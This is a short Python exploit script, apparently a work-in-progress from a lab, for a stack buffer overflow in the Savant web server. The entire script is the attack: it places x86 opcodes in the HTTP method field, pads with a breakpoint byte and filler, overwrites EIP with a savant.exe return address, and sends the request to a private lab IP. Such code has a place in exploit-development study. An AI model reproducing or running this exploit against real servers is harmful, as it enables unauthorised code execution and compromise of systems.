#!/usr/bin/python
import socket
 
banner = """
#----------------------------------------------#
Savant Exploit - Egghunter
#----------------------------------------------#
"""

target_address="172.16.73.129"
target_port=80
 
badbuffer = "\xcc"
badbuffer += "A"*(254-len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP overwrite 00401d09 savant.exe pop ebp, retn
httpmethod = "\xb0\x03\x04\x01\x7B\x15" # MOV AL, 3; ADD AL, 1; JPO 15

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n'

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address, target_port))
sock.send(sendbuf)
sock.close()

